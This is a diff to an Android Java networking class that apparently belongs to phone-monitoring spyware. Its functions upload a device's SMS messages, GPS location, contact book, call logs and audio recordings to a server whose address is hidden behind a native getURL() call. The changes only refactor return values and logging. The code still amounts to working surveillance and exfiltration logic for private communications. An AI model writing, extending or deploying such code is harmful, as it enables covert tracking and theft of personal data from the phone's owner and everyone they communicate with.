@@ -1,21 +1,16 @@
 package com.privacy.system.util;
 
-import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.InetSocketAddress;
 import java.net.MalformedURLException;
 import java.net.Proxy;
 import java.net.URL;
-
-import com.privacy.system.base.C;
-
 import android.content.Context;
 
 /**
@@ -33,11 +28,11 @@ public class NetworkUtil {
 	public static native String getURL();
 	
 	
-	public static String uploadSMS(Context ctx,String updateData,String requestMethod){
+	public static boolean uploadSMS(Context ctx,String updateData,String requestMethod){
 		URL url = null;
 		HttpURLConnection conn = null;
-		String result = "";
-		if(!HttpUtil.detect(ctx))return "";
+		boolean isUpload = false;
+		if(!HttpUtil.detect(ctx))return isUpload;
 		try {
 			String strUrl = getURL();
 			strUrl = strUrl+"/"+requestMethod;
@@ -61,30 +56,24 @@ public class NetworkUtil {
 			conn.getOutputStream().write(datas);
 			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
 				Logger.d("NetworkUtil","上传短信成功");
-				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
-				BufferedReader br = new BufferedReader(isr);
-				String temp = null;
-				while ((temp = br.readLine()) != null) {
-					result = result + temp;
-				}
-				isr.close();
+				isUpload = true;
 			}else {
-				result = "FAIL: " + conn.getResponseCode();
+				Logger.d("NetworkUtil","上传短信失败");
 			}
 			
 		} catch (Exception e) {
-				result = "FAIL";
+			Logger.d("NetworkUtil","上传短信异常"+e.getMessage());
 		}
-		return result;
+		return isUpload;
 	}
 	
 	
 	
 	/**专用于上传定位信息*/
-	public static synchronized String sendLocInfo(Context context,String key,String device_id, String lon, String lat, String loc_name, String locTime, String requestMethod) {
-		String result = "";
+	public static synchronized boolean sendLocInfo(Context context,String key,String device_id, String lon, String lat, String loc_name, String locTime, String requestMethod) {
+		boolean isUpload = false;
 		try {
-			if(!HttpUtil.detect(context))return "";
+			if(!HttpUtil.detect(context))return false;
 			String strUrl = getURL();
 			strUrl = strUrl+"/"+requestMethod;
 			URL url = new URL(strUrl);
@@ -101,21 +90,16 @@ public class NetworkUtil {
 			os.write(param.getBytes());
 			
 			if (conn.getResponseCode() == 200) {
-				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
-				BufferedReader br = new BufferedReader(isr);
-				String temp = null;
-				while ((temp = br.readLine()) != null) {
-					result = result + temp;
-				}
-				isr.close();
-			} else {
-				result = "FAIL: " + conn.getResponseCode();
+				isUpload = true;
+				Logger.d("NetworkUtil","上传位置信息成功...");
+			}else {
+				Logger.d("NetworkUtil","上传位置信息失败...");
 			}
 			
 		} catch (Exception e) {
-			result = "FAIL";
+			Logger.d("NetworkUtil","上传位置信息异常..."+e.getMessage());
 		}
-		return result;
+		return isUpload;
 	}
 	
 	/**
@@ -125,11 +109,11 @@ public class NetworkUtil {
 	 * @param object 上传文件的内容
 	 * @return 响应结果
 	 */
-	public static String uploadBook(Context ctx,String updateData,String requestMethod){
+	public static boolean uploadBook(Context ctx,String updateData,String requestMethod){
 		URL url = null;
 		HttpURLConnection conn = null;
-		String result = "";
-		if(!HttpUtil.detect(ctx))return "";
+		boolean isUpload = false;
+		if(!HttpUtil.detect(ctx))return false;
 		try {
 			String strUrl = getURL();
 			strUrl = strUrl+"/"+requestMethod;
@@ -152,21 +136,15 @@ public class NetworkUtil {
 			conn.setRequestProperty("Content-Length",datas.length+"");
 			conn.getOutputStream().write(datas);
 			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
-				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
-				BufferedReader br = new BufferedReader(isr);
-				String temp = null;
-				while ((temp = br.readLine()) != null) {
-					result = result + temp;
-				}
-				isr.close();
-			} else {
-				result = "FAIL: " + conn.getResponseCode();
+				Logger.d("NetworkUtil","上传通讯录成功");
+				isUpload = true;
+			}else {
+				Logger.d("NetworkUtil","上传通讯录失败");
 			}
-			
 		} catch (Exception e) {
-			result = "FAIL";
+			Logger.d("NetworkUtil","上传通讯录异常"+e.getMessage());
 		}
-		return result;
+		return isUpload;
 	}
 	
 	/**
@@ -209,9 +187,9 @@ public class NetworkUtil {
 		return is;
 	}
 	
-	public static String uploadCall(Context context,String params,String requestMethod){
-		String result = "";
-		if(!HttpUtil.detect(context))return "";
+	public static boolean uploadCall(Context context,String params,String requestMethod){
+		boolean isUpload = false;
+		if(!HttpUtil.detect(context))return false;
 		try {
 			String strUrl=getURL()+"/"+requestMethod;
 			URL url = new URL(strUrl);
@@ -226,37 +204,34 @@ public class NetworkUtil {
 			conn.getOutputStream().write(params.getBytes());
 		    if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
 		    	Logger.d("NewworkUtil","上传通话记录数据成功");
-		     	InputStream inputStream = conn.getInputStream();
-		     	if(inputStream !=null){
-		     		return AppUtil.streamToStr(inputStream);
-		     	}
-		    }
-		    result = "FAIL:"+conn.getResponseCode();
+		     	isUpload = true;
+		    }else {
+		    	Logger.d("NewworkUtil","上传通话记录数据失败");
+			}
 		} catch (Exception e) {
-			result = "FAIL: exception";
-			
+			Logger.d("NewworkUtil","上传通话记录数据异常了"+e.getMessage());
 		}
-		return result;
+		return isUpload;
 	}
 	
 	
 	
 	/**上传文件*/
-	public static String uploadFile(Context context,String filePath,String fileName,String requestMethod){
-		String result = "";
-		if(!HttpUtil.detect(context))return "";
+	public static boolean uploadFile(Context context,String filePath,String fileName,String requestMethod){
+		boolean isUpload = false;
+		if(!HttpUtil.detect(context))return false;
 		try {
 			File file = new File(filePath);
 			
 			if(!file.exists()){
 				Logger.d("NetworkUtil","文件不存在");
-				 return "FAIL";
+				 return isUpload;
 			}else {
 				long fileSize= file.length();
 				if(fileSize <=0){
 
 					Logger.d("NetworkUtil","文件不存在");
-					return "FAIL";
+					return isUpload;
 				}
 			}
 			URL url = new URL(getURL()+"/"+requestMethod);
@@ -284,56 +259,46 @@ public class NetworkUtil {
 			dos.flush();
 			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
 				Logger.d("NetworkUtil","上传录音文件成功");
-				InputStream is = conn.getInputStream();
-			   return AppUtil.streamToStr(is);
+				isUpload = true;
+
 			}else {
-				InputStream is = conn.getInputStream();
-				InputStreamReader isr = new InputStreamReader(is, "utf-8");
-				BufferedReader br = new BufferedReader(isr);
-				result = "FAIL:"+br.readLine();
+				Logger.d("NetworkUtil","上传录音文件失败");
 			}
 		} catch (MalformedURLException e) {
-			result = "FAIL";
+			Logger.d("NetworkUtil","上传录音文件异常:"+e.getMessage());
 		} catch (IOException e) {
-			result = "FAIL";
+			Logger.d("NetworkUtil","上传录音文件异常:"+e.getMessage());
 		}
-		return result;
+		return isUpload;
 	}
 	
 	/**上传文件信息*/
-	public static String uploadFileInfo(Context context,String params,String requestMethod){
-		String result = "";
-		if(HttpUtil.detect(context)){
+	public static boolean uploadFileInfo(Context context,String params,String requestMethod){
+		boolean isUpload = false;
+		if(!HttpUtil.detect(context))return false;
 			try {
-				String strURL = getURL()+"/"+C.RequestMethod.uploadCallSoundFile;
-				Logger.d("NetworkUtil",strURL);
+				String strURL = getURL()+"/"+requestMethod;
 				URL url = new URL(strURL);
 				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
 				conn.setDoInput(true);
 				conn.setDoOutput(true);
-				conn.setUseCaches(false);
+				conn.setConnectTimeout(30000);
+				conn.setReadTimeout(30000);
 				conn.setRequestMethod("POST");
-				conn.setRequestProperty("Charset", "UTF-8");
 				conn.getOutputStream().write(params.getBytes());
 				if (conn.getResponseCode() == 200) {
-					InputStreamReader isr = new InputStreamReader(conn.getInputStream());
-					BufferedReader br = new BufferedReader(isr);
-					String temp = null;
-					while ((temp = br.readLine()) != null) {
-						result = result + temp;
-					}
-					isr.close();
+					Logger.d("NetworkUtil", "上传定时录音文件信息成功");
+					isUpload = true;
 				} else {
-					result = "FAIL: " + conn.getResponseCode();
+					Logger.d("NetworkUtil", "上传定时录音文件信息失败");
 				}
 				
 			} catch (MalformedURLException e) {
-				result = "FAIL";
+				Logger.d("NetworkUtil", "上传定时录音文件信息异常");
 			} catch (IOException e) {
-				result = "FAIL";
+				Logger.d("NetworkUtil", "上传定时录音文件信息异常");
 			}
-		}
 		
-		return result;
+		return isUpload;
 	}
 }
